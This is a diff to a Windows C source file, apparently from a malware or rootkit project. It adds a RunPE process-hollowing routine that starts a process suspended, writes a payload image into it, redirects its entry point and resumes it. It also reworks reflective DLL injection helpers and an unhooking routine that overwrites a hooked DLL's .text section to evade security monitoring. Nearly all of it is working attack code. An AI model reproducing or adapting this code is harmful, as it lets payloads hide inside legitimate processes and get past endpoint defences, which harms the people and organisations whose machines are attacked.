@@ -488,6 +488,112 @@ HANDLE CreatePublicNamedPipe(LPCWSTR name)
 	return CreateNamedPipeW(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, &securityAttributes);
 }
 
+BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
+{
+	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+
+	if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
+	{
+		switch (ntHeaders->OptionalHeader.Magic)
+		{
+			case 0x10b:
+				*is64Bit = FALSE;
+				return TRUE;
+			case 0x20b:
+				*is64Bit = TRUE;
+				return TRUE;
+		}
+	}
+
+	return FALSE;
+}
+BOOL RunPE(LPCWSTR path, LPBYTE payload)
+{
+	// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
+	// This is a workaround to the well known stability issue of process hollowing.
+	for (DWORD i = 0; i < 5; i++)
+	{
+		DWORD processId = 0;
+		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
+
+		if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
+		{
+			PROCESS_INFORMATION processInformation;
+			STARTUPINFOW startupInfo;
+			ZeroMemory(&processInformation, sizeof(processInformation));
+			ZeroMemory(&startupInfo, sizeof(startupInfo));
+
+			if (CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInformation))
+			{
+				processId = processInformation.dwProcessId;
+
+				//TODO: NtUnmapViewOfSection here
+
+				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
+				{
+					BOOL sectionsWritten = TRUE;
+
+					for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
+					{
+						PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + j * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER);
+
+						if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeader->VirtualAddress, (LPBYTE)payload + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL))
+						{
+							sectionsWritten = FALSE;
+							break;
+						}
+					}
+
+					if (sectionsWritten)
+					{
+						LPCONTEXT context = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+						if (context)
+						{
+							context->ContextFlags = CONTEXT_FULL;
+
+							if (GetThreadContext(processInformation.hThread, context))
+							{
+#ifdef _WIN64
+								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Rdx + sizeof(LPVOID) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(LPVOID), NULL))
+								{
+									context->Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+									if (SetThreadContext(processInformation.hThread, context) &&
+										ResumeThread(processInformation.hThread) != -1)
+									{
+										return TRUE;
+									}
+								}
+#else
+								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + sizeof(LPVOID) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(LPVOID), NULL))
+								{
+									context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+									if (SetThreadContext(processInformation.hThread, context) &&
+										ResumeThread(processInformation.hThread) != -1)
+									{
+										return TRUE;
+									}
+								}
+#endif
+							}
+						}
+					}
+				}
+			}
+		}
+
+		if (processId != 0)
+		{
+			HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
+			if (process)
+			{
+				TerminateProcess(process, 0);
+			}
+		}
+	}
+
+	return FALSE;
+}
 BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 {
 	BOOL result = FALSE;
@@ -556,9 +662,10 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 }
 DWORD GetReflectiveDllMain(LPBYTE dll)
 {
-	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
-	if (ntHeaders->OptionalHeader.Magic == 0x10b && sizeof(LPVOID) == 4 || ntHeaders->OptionalHeader.Magic == 0x20b && sizeof(LPVOID) == 8)
+	BOOL is64Bit;
+	if (IsExecutable64Bit(dll, &is64Bit) && is64Bit == (sizeof(LPVOID) == 8))
 	{
+		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
 		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dll + RvaToOffset(dll, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
 		LPDWORD nameDirectory = (LPDWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNames));
 		LPWORD nameOrdinalDirectory = (LPWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNameOrdinals));
@@ -627,11 +734,11 @@ VOID UnhookDll(LPCWSTR name)
 						LPVOID dllMappedFile = MapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
 						if (dllMappedFile)
 						{
-							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);
+							PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);
 
-							for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
+							for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
 							{
-								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));
 
 								// Find the .text section of the hooked DLL and overwrite it with the original DLL section
 								if (!lstrcmpiA((LPCSTR)sectionHeader->Name, ".text"))
